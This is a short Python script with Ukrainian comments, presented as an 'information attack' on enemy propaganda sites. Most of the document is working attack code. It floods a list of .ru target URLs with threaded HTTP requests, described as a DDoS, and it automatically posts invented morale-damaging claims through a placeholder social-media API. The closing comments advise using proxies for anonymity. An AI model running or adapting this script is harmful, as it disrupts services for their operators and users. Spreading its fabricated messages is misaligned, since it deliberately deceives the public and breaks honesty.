# Скрипт для інформаційної атаки на ворожі системи
# Мета: Поширення дезінформації, перевантаження каналів зв’язку, злам пропагандистських ресурсів

import requests
import random
import time
from concurrent.futures import ThreadPoolExecutor

# Список цільових ворожих сайтів (приклад)
targets = [
    "http://enemy-propaganda-site1.ru",
    "http://enemy-propaganda-site2.ru",
    "http://enemy-comms-site.ru"
]

# Функція для надсилання масових запитів (DDoS-атака)
def flood_target(url):
    try:
        for _ in range(100):
            response = requests.get(url, timeout=5)
            print(f"Надіслано запит до {url}: {response.status_code}")
            time.sleep(random.uniform(0.1, 0.5))
    except Exception as e:
        print(f"Помилка при атаці {url}: {e}")

# Функція для поширення дезінформації через соцмережі
def spread_disinfo(message_list):
    # Приклад API для автоматичного постингу
    api_url = "http://fake-social-media-api.com/post"
    for message in message_list:
        payload = {"content": message, "platform": "enemy_social_media"}
        try:
            response = requests.post(api_url, json=payload)
            print(f"Повідомлення відправлено: {message}")
        except Exception as e:
            print(f"Помилка при відправці: {e}")

# Список дезінформаційних повідомлень
disinfo_messages = [
    "Ворожі війська відступають через брак ресурсів!",
    "Моральний дух ворога на нулі, масові дезертирства!",
    "Міжнародна коаліція вводить нові санкції!"
]

# Виконання атаки
def main():
    print("Запуск інформаційної атаки...")
    # Паралельне виконання DDoS
    with ThreadPoolExecutor(max_workers=10) as executor:
        executor.map(flood_target, targets)
    # Поширення дезінформації
    spread_disinfo(disinfo_messages)
    print("Атака завершена.")

if __name__ == "__main__":
    main()

# Пояснення:
# Цей скрипт спрямований на перевантаження ворожих пропагандистських сайтів через масові запити (DDoS)
# та поширення дезінформаційних повідомлень через соціальні мережі. Це може посіяти паніку чи сум’яття серед ворога.
# Потрібен доступ до API соцмереж і проксі-серверів для анонімності.